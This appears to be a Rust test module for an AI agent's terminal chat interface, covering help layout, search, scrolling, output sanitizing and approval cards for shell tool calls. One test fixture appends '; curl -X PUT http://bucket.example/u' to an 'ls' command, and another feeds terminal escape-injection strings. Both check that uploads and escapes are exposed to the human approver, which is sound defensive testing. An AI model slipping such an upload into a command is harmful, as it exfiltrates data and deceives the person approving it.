        let right = (left + 1..buffer.area.width)
            .find(|&x| buffer[(x, top)].symbol() == "┐")
            .unwrap();
        (top + 1..buffer.area.height)
            .take_while(|&y| buffer[(left, y)].symbol() == "│")
            .map(|y| {
                (left + 1..right)
                    .map(|x| buffer[(x, y)].symbol().to_string())
                    .collect()
            })
            .collect()
    }

    /// `/help` is two aligned tables at each size: every description
    /// starts at its table's column, at least two cells past the longest
    /// name, and every continued line starts at that same column. It used
    /// to wrap as a note, continued lines back at the left margin, and
    /// "Backspace Delete" one cell from its description.
    #[test]
    fn help_is_two_aligned_tables_at_each_size() {
        let now = Instant::now();
        let tables = [
            (
                "commands",
                help_column(super::super::slash::COMMANDS),
                super::super::slash::COMMANDS,
            ),
            (
                "keys",
                help_column(super::super::app::KEYS),
                super::super::app::KEYS,
            ),
        ];
        for (w, h) in [(80u16, 24u16), (120, 24)] {
            let mut seen: Vec<String> = Vec::new();
            // Every part of the list, scrolled through it from the bottom
            // to the top in steps shorter than the screen.
            for scroll in (0..=60).step_by(8) {
                let mut app = App::new(Some("default".into()), "c-1".into());
                app.entries.push(Entry::Help);
                app.scroll = scroll;
                let rows = transcript_rows(&drawn(&app, now, w, h));
                // The column of the last entry above, once one is on screen;
                // continued lines at the top, whose entry scrolled off, sit
                // at one of the two columns.
                let mut column: Option<usize> = None;
                for cells in rows {
                    let text: String = cells.concat();
                    let lead = cells.iter().take_while(|c| c.as_str() == " ").count();
                    if text.trim().is_empty()
                        || tables.iter().any(|(title, ..)| text.trim() == *title)
                    {
                        continue;
                    }
                    if lead == HELP_INDENT {
                        let (_, col, _) = tables
                            .iter()
                            .find(|(_, col, rows)| {
                                let name = cells[HELP_INDENT..(*col).min(cells.len())].concat();
                                rows.iter().any(|(n, _)| name.trim_end() == *n)
                            })
                            .unwrap_or_else(|| {
                                panic!("{w}x{h}: no entry starts this row: {text:?}")
                            });
                        assert!(
                            cells[col - HELP_GAP..*col].iter().all(|c| c == " "),
                            "{w}x{h}: less than {HELP_GAP} cells before the description: {text:?}"
                        );
                        assert_ne!(
                            cells[*col], " ",
                            "{w}x{h}: description not at column {col}: {text:?}"
                        );
                        seen.push(cells[HELP_INDENT..*col].concat().trim().to_string());
                        column = Some(*col);
                    } else {
                        match column {
                            Some(col) => assert_eq!(
                                lead, col,
                                "{w}x{h}: continued line not under its description: {text:?}"
                            ),
                            None => assert!(
                                tables.iter().any(|(_, col, _)| lead == *col),
                                "{w}x{h}: continued line at no description column: {text:?}"
                            ),
                        }
                    }
                }
            }
            for (_, _, rows) in tables {
                for (name, _) in rows {
                    assert!(seen.iter().any(|s| s == name), "{w}x{h}: {name} not shown");
                }
            }
        }
    }

    /// Ctrl+F opens the search only where the sidebar it lives in is
    /// drawn. Where it is not, the status line says why and what is typed
    /// next stays in the draft, on screen; a search left open by a resize
    /// to such a width is closed.
    #[test]
    fn search_opens_only_where_the_sidebar_is_drawn() {
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let now = Instant::now();
        let ctrl_f = KeyEvent::new(KeyCode::Char('f'), KeyModifiers::CONTROL);
        for (w, h) in [(80u16, 24u16), (120, 24), (120, 40)] {
            let mut app = App::new(Some("default".into()), "c-1".into());
            app.set_columns(w);
            app.on_key(ctrl_f, now);
            let shown = all_text(&drawn(&app, now, w, h));
            for c in "list".chars() {
                app.on_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE), now);
            }
            let typed = all_text(&drawn(&app, now, w, h));
            if w < 120 {
                assert!(!app.searching, "{w}x{h}: the search opened unseen");
                assert!(
                    shown.contains("search needs the sidebar: 120 columns, 80 now"),
                    "{w}x{h}:\n{shown}"
                );
                assert_eq!(app.draft, "list", "{w}x{h}");
                assert!(
                    typed.contains("list"),
                    "{w}x{h}: the typing is not on screen"
                );
            } else {
                assert!(app.searching, "{w}x{h}");
                assert!(typed.contains("search: list"), "{w}x{h}:\n{typed}");
                assert!(app.draft.is_empty(), "{w}x{h}");
            }
        }
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.set_columns(120);
        app.on_key(ctrl_f, now);
        assert!(app.searching);
        app.set_columns(80);
        assert!(
            !app.searching,
            "a resize left the search open where it is not drawn"
        );
    }

    /// At the latest row of a conversation taller than the window, the
    /// rule says how much is above and nothing about below; a
    /// conversation that fits says nothing, and has no thumb.
    #[test]
    fn the_rule_says_above_only_at_the_latest_row_and_nothing_when_it_fits() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.entries.push(Entry::Note("short".into()));
        let fits = text_of(&drawn(&app, now, 120, 24));
        assert!(!fits.contains("above") && !fits.contains("█"), "{fits}");
        for n in 0..40 {
            app.entries.push(Entry::Note(format!("line {n}")));
        }
        let latest = text_of(&drawn(&app, now, 120, 24));
        assert!(latest.contains("↑ 63 above ┤"), "{latest}");
        assert!(!latest.contains("below") && latest.contains("█"), "{latest}");
        assert_eq!(thumb(19, 46, 17), (7, 15));
        assert_eq!(thumb(35, 46, 1), (1, 28));
        assert_eq!(thumb(19, 19, 0), (0, 0));
    }

    #[test]
    fn model_text_reaches_the_screen_without_its_escapes() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.on_server(
            ServerEvent::Reply("fine\x1b[2J\x1b]0;owned\x07 \u{202E}txt.exe".into()),
            now,
        );
        let shown = screen(&app, now);
        assert!(shown.contains("fine txt.exe"), "{shown}");
        assert!(!shown.contains('\x1b'));
        assert!(!shown.contains('\u{202E}'));
    }

    /// A tool's output is drawn under its line, through the sanitizer
    /// and cut past a few rows, and stays when the model's reply after
    /// it is the empty-reply fallback.
    #[test]
    fn a_tools_output_is_drawn_under_its_line() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.on_server(
            ServerEvent::ToolCall {
                id: "c1".into(),
                name: "exec".into(),
                arguments: r#"{"command":"ls"}"#.into(),
            },
            now,
        );
        let output: String = (1..=10)
            .map(|i| format!("file{i}.txt\x1b[2J\u{202E}\n"))
            .collect();
        app.on_server(
            ServerEvent::ToolResult {
                id: "c1".into(),
                name: "exec".into(),
                success: true,
                output,
            },
            now,
        );
        app.on_server(
            ServerEvent::Reply("(no response: the model returned nothing)".into()),
            now,
        );
        let shown = screen(&app, now);
        for part in [
            "tool exec {\"command\":\"ls\"} done",
            "    file1.txt",
            "    file6.txt",
            "    ... (cut)",
            "(no response: the model returned nothing)",
        ] {
            assert!(shown.contains(part), "{part:?} missing:\n{shown}");
        }
        assert!(!shown.contains("file7.txt"), "{shown}");
        assert!(!shown.contains('\x1b'));
        assert!(!shown.contains('\u{202E}'));
    }

    #[test]
    fn the_card_shows_what_is_being_approved() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.on_server(
            ServerEvent::Approval(ApprovalAsk {
                request_id: "r1".into(),
                tool_name: "exec".into(),
                action_key: "shell:ls".into(),
                tier: "tier2".into(),
                agent: "default".into(),
                trigger: "list the files".into(),
                exec_location: "runs on this host as davi".into(),
                arguments: r#"{"command":"ls -la"}"#.into(),
                assistant_text: "I'll list them.".into(),
                timeout_secs: 300,
                exec_runtime: "gvisor".into(),
            }),
            now,
        );
        let shown = screen(&app, now);
        for part in [
            "request: agent default requests exec (tier2)",
            "action key: shell:ls",
            "arguments: {\"command\":\"ls -la\"}",
            "runtime: gVisor (runsc)",
            "in reply to: list the files",
            "approval needed",
            "shell:ls",
            "ls -la",
            "runs on this host as davi",
            "I'll list them.",
            "list the files",
            "gVisor (runsc)",
            "model's claim (unverified)",
            "takes an answer in a moment",
        ] {
            assert!(shown.contains(part), "{part:?} missing:\n{shown}");
        }
    }

    /// A card for an `exec` whose command is `chars` characters long,
    /// with the upload at its end.
    fn long_card_app(now: Instant, chars: usize) -> App {
        let mut app = App::new(Some("default".into()), "c-1".into());
        let tail = "; curl -X PUT http://bucket.example/u";
        let command = format!("ls {}{tail}", "a".repeat(chars - tail.len() - 3));
        app.on_server(
            ServerEvent::Approval(ApprovalAsk {
                request_id: "r1".into(),
                tool_name: "exec".into(),
                action_key: "shell::pipeline:".into(),
                tier: "tier3".into(),
                agent: "default".into(),
                trigger: "list the files".into(),
                exec_location: "runs in sandbox container".into(),
                arguments: serde_json::json!({ "command": command }).to_string(),
                assistant_text: String::new(),
                timeout_secs: 300,
                exec_runtime: "docker".into(),
            }),
            now,
        );
        app
    }

    fn enter_y(app: &mut App, t: Instant) -> Option<crate::commands::chat::app::Outgoing> {
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        app.on_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE), t);
        app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), t)
    }

    /// The arguments get every row they need, so the end of a long
    /// command is on the screen and the card takes an approval.
    #[test]
    fn a_long_command_is_drawn_to_its_end_and_can_be_approved() {
        let now = Instant::now();
        let mut app = long_card_app(now, 900);
        let shown = text_of(&drawn(&app, now, 100, 50)).replace([' ', '\n'], "");
        assert!(shown.contains("-XPUThttp://bucket.example/u\"}"), "{shown}");
        assert!(!app.card_cut.get());
        let t = now + crate::commands::chat::app::ARMING;
        assert!(matches!(
            enter_y(&mut app, t),
            Some(crate::commands::chat::app::Outgoing::Decision { approve: true, .. })
        ));
    }

    /// On a screen too small for the card, `y` approves nothing: the
    /// card stays in front, the transcript says why, and a refusal is
    /// still taken.
    #[test]
    fn a_card_that_does_not_fit_the_screen_takes_no_approval() {
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let now = Instant::now();
        let mut app = long_card_app(now, 900);
        let shown = text_of(&drawn(&app, now, 60, 16)).replace([' ', '\n'], "");
        assert!(
            !shown.contains("-XPUThttp://bucket.example/u\"}"),
            "{shown}"
        );
        assert!(app.card_cut.get());
        let t = now + crate::commands::chat::app::ARMING;
        assert_eq!(enter_y(&mut app, t), None);
        assert!(app.front_card().is_some(), "the card is still in front");
        assert!(app.entries.iter().any(
            |e| matches!(e, Entry::Note(n) if n == crate::commands::chat::app::CUT_CARD_NOTE)
        ));
        app.on_key(KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE), t);
        assert!(matches!(
            app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), t),
            Some(crate::commands::chat::app::Outgoing::Decision { approve: false, .. })
        ));
    }

    fn card_app(now: Instant) -> App {
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.on_server(
            ServerEvent::Approval(ApprovalAsk {
                request_id: "r1".into(),
                tool_name: "exec".into(),
                action_key: "shell:ls".into(),
                tier: "tier2".into(),
                agent: "default".into(),
                trigger: "list the files".into(),
                exec_location: "runs in sandbox container".into(),
                arguments: r#"{"command":"ls"}"#.into(),
                assistant_text: "Only reading, nothing changes.".into(),
                timeout_secs: 300,
                exec_runtime: "docker".into(),
            }),
            now,
        );
        app
    }

    /// The buffer, and where `needle` starts in it.
    fn find(buffer: &ratatui::buffer::Buffer, needle: &str) -> (u16, u16) {
        for y in 0..buffer.area.height {
            let row: String = (0..buffer.area.width)
                .map(|x| buffer[(x, y)].symbol().to_string())
                .collect();
            if let Some(i) = row.find(needle) {
                return (u16::try_from(row[..i].chars().count()).unwrap(), y);
            }
        }
        panic!("{needle:?} not on screen");
    }

    fn styles_of(buffer: &ratatui::buffer::Buffer, needle: &str) -> Vec<Style> {
        let (x, y) = find(buffer, needle);
        (0..u16::try_from(needle.chars().count()).unwrap())
            .map(|i| buffer[(x + i, y)].style())
            .collect()
    }

    fn drawn(app: &App, now: Instant, w: u16, h: u16) -> ratatui::buffer::Buffer {
        let mut terminal = Terminal::new(TestBackend::new(w, h)).unwrap();
        terminal.draw(|f| draw(f, app, now)).unwrap();
        terminal.backend().buffer().clone()
    }

    fn text_of(buffer: &ratatui::buffer::Buffer) -> String {
        let mut out = String::new();
        for y in 0..buffer.area.height {
            for x in 0..buffer.area.width {
                out.push_str(buffer[(x, y)].symbol());
            }
            out.push('\n');
        }
        out
    }

    /// The panels are drawn wherever they fit, taking the sidebar's
    /// place when the two do not fit together, and a screen too narrow
    /// for them says so instead of ignoring the toggle.
    #[test]
    fn the_panels_toggle_is_never_silent() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.show_sidebar = true;
        app.show_panels = true;

        let wide = text_of(&drawn(&app, now, 130, 30));
        assert!(
            wide.contains(" agents ") && wide.contains(" status "),
            "{wide}"
        );
        assert!(!wide.contains("columns"), "{wide}");

        let middling = text_of(&drawn(&app, now, 100, 30));
        assert!(middling.contains(" status "), "{middling}");
        assert!(!middling.contains(" agents "), "{middling}");

        // Below the full width the panels narrow to one column, and only
        // when even that cannot fit do they go.
        let narrow = text_of(&drawn(&app, now, 80, 30));
        assert!(narrow.contains(" status "), "{narrow}");
        let tiny = text_of(&drawn(&app, now, 50, 30));
        assert!(!tiny.contains(" Context "), "{tiny}");

        app.show_panels = false;
        let off = text_of(&drawn(&app, now, 100, 30));
        assert!(
            off.contains(" agents ") && !off.contains(" status "),
            "{off}"
        );
        assert!(off.contains("Enter send"), "{off}");
    }

    #[test]
    fn approve_and_refuse_are_drawn_alike() {
        let now = Instant::now();
        // 80 columns: the narrow panels take 24, and the hint fits the rest.
        let buffer = drawn(&card_app(now), now, 80, 30);
        let approve = styles_of(&buffer, "[y] approve");
        let refuse = styles_of(&buffer, "[n] refuse");
        assert!(approve.iter().all(|s| *s == approve[0]));
        assert!(refuse.iter().all(|s| *s == refuse[0]));
        assert_eq!(approve[0], refuse[0], "neither answer is emphasised");
        find(&buffer, "Enter alone refuses.");
    }

    #[test]
    fn the_models_words_are_labeled_a_claim_and_the_gateways_are_not() {
        let now = Instant::now();
        let buffer = drawn(&card_app(now), now, 80, 30);
        let claim = styles_of(&buffer, "model's claim (unverified): Only reading");
        assert!(
            claim
                .iter()
                .all(|s| s.add_modifier.contains(Modifier::ITALIC)),
            "the claim is set apart"
        );
        for established in [
            "shell:ls",
            "list the files",
            "{\"command\":\"ls\"}",
            "Docker default runtime (runc)",
        ] {
            assert!(
                styles_of(&buffer, established)
                    .iter()
                    .all(|s| !s.add_modifier.contains(Modifier::ITALIC)),
                "{established} is drawn as established, not as a claim"
            );
        }
    }

    #[test]
    fn the_exec_runtime_is_the_one_the_gateway_named() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        assert!(
            !screen(&app, now).contains("exec:"),
            "nothing said before the gateway says"
        );
        app.on_answer(
            crate::commands::chat::wire::Query::Status,
            serde_json::json!({"agent": "default", "environment": {"exec": {"mode": "gvisor", "runtime": "gvisor"}}}),
        );
        // Environment names it; the key bar has keys only.
        let buffer = drawn(&app, now, 200, 40);
        find(&buffer, "Environment");
        find(&buffer, "gVisor (runsc)");
        let text: String = (0..buffer.area.height)
            .flat_map(|y| (0..buffer.area.width).map(move |x| (x, y)))
            .map(|(x, y)| buffer[(x, y)].symbol().to_string())
            .collect();
        assert!(!text.contains("exec: "), "the key bar names the runtime");
    }

    #[test]
    fn the_panels_and_the_sidebar_show_what_the_gateway_sent() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.on_answer(
            crate::commands::chat::wire::Query::Status,
            serde_json::json!({
                "agent": "default",
                "environment": {"data_dir": "~/.wirken", "agent": "default", "provider": "ollama", "model": "llama3.1",
                                "exec": {"mode": "exec_only", "runtime": "docker"}},
                "context": {"used_tokens": 1500, "window": 32000},
                "cost": {"calls": 1, "input_tokens": 12, "output_tokens": 7, "budget": {"mode": "off"}},
                "audit": {"rows": 6, "heads": 1, "unsigned_tail": 0},
                "approvals": {"approved": 0, "denied": 0, "grants": []},
                "tools": {"count": 13, "ask_first": 5, "names": ["exec"], "skills": []}
            }),
        );
        app.on_answer(
            crate::commands::chat::wire::Query::Conversations,
            serde_json::json!({
                "agents": [{"id": "default", "provider": "ollama", "model": "llama3.1"}],
                "conversations": [{"agent": "default", "conversation": "c-1", "title": "list the files", "updated": "2026-10-20T15:25:00+00:00"}]
            }),
        );
        let buffer = drawn(&app, now, 200, 50);
        for part in [
            "Environment",
            "~/.wirken",
            "Context",
            "about 1.5k of 32.0k tokens",
            "Cost and tokens",
            "uncosted",
            "budget off",
            "Audit",
            "6 rows · 1 chain heads",
            "Approvals",
            "no stored grants",
            "Tools",
            "13 tools · 5 ask first",
            "+ new chat",
            "ollama/llama3.1",
            "list the files",
            "15:25",
        ] {
            find(&buffer, part);
        }
    }

    #[test]
    fn an_agent_reply_is_drawn_as_markdown() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.entries.push(Entry::Agent(
            "## Results\n- **first** item\n`code` here".into(),
        ));
        let shown = text_of(&drawn(&app, now, 80, 30));
        assert!(shown.contains("Results"), "{shown}");
        assert!(!shown.contains("## Results"), "{shown}");
        assert!(shown.contains("• first item"), "{shown}");
        assert!(!shown.contains("**first**"), "{shown}");
        assert!(shown.contains("code here"), "{shown}");
    }
}
